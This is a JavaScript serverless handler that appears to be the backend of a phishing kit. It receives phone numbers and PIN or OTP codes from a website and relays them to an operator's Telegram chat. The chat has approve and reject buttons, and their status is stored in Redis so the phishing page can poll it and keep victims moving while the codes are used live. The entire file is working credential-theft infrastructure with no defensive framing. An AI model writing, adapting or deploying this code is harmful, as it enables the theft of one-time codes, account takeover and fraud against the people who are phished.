export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    // Database variables
    const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
    const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;

    // Helper function to save to database using HTTP
    async function setStatus(userId, status) {
        if (!REDIS_URL || !REDIS_TOKEN) return;
        await fetch(`${REDIS_URL}/set/status_${userId}/${status}`, {
            headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
        });
    }

    // 1. GET Request (Website Polling)
    if (req.method === 'GET') {
        try {
            const { userId } = req.query;
            if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Database env vars missing' });
            
            const dbRes = await fetch(`${REDIS_URL}/get/status_${userId}`, {
                headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
            });
            const dbData = await dbRes.json();
            
            const status = dbData.result || 'pending';
            return res.status(200).json({ status: status });
        } catch (error) {
            return res.status(500).json({ error: 'Database error' });
        }
    }

    // 2. POST Request from Website (Send PIN/OTP to Telegram)
    if (req.method === 'POST' && req.body && req.body.action === 'send_verification') {
        try {
            const { phone, pin, userId, type } = req.body; 
            
            if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
                return res.status(500).json({ error: 'Missing Telegram Token or Chat ID in Vercel settings.' });
            }
            if (!REDIS_URL || !REDIS_TOKEN) {
                return res.status(500).json({ error: 'Database not connected.' });
            }

            await setStatus(userId, 'pending');

            const text = `# Thor - ${type.toUpperCase()} Verification\n` +
                         `${type.toUpperCase()} VERIFICATION NEEDED\n\n` +
                         `USER DETAILS:\n` +
                         `• Phone Number: ${phone}\n` +
                         `• ${type.toUpperCase()} Code: ${pin}\n` +
                         `• Username: user_${userId}`;

            const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: text,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "✅ Correct PIN", callback_data: `approve_${userId}_${type}` }],
                            [{ text: "❌ Wrong PIN", callback_data: `reject_${userId}_${type}` }]
                        ]
                    }
                })
            });

            const tgData = await tgRes.json();
            
            if (!tgRes.ok) {
                return res.status(500).json({ error: tgData.description || "Telegram rejected the message" });
            }

            return res.status(200).json({ success: true });
        } catch (error) {
            return res.status(500).json({ error: error.message });
        }
    }

    // 3. POST Request from Telegram (Admin clicks a button)
    if (req.method === 'POST' && req.body && req.body.callback_query) {
        try {
            const { id, data, message } = req.body.callback_query;
            const [action, userId, type] = data.split('_'); 

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: id })
            });

            if (action === 'approve') {
                await setStatus(userId, 'approved');
                await editTelegramMessage(message.message_id, `✅ PIN APPROVED - User can proceed`);
            } else if (action === 'reject') {
                await setStatus(userId, 'rejected');
                await editTelegramMessage(message.message_id, `❌ WRONG ${type.toUpperCase()} - Rejected`);
            }
            return res.status(200).send('OK');
        } catch (error) {
            return res.status(500).send('Error');
        }
    }
    
    return res.status(200).send('OK');
}

async function editTelegramMessage(messageId, text) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: messageId,
            reply_markup: { inline_keyboard: [[{ text: text, callback_data: "noop" }]] }
        })
    });
}
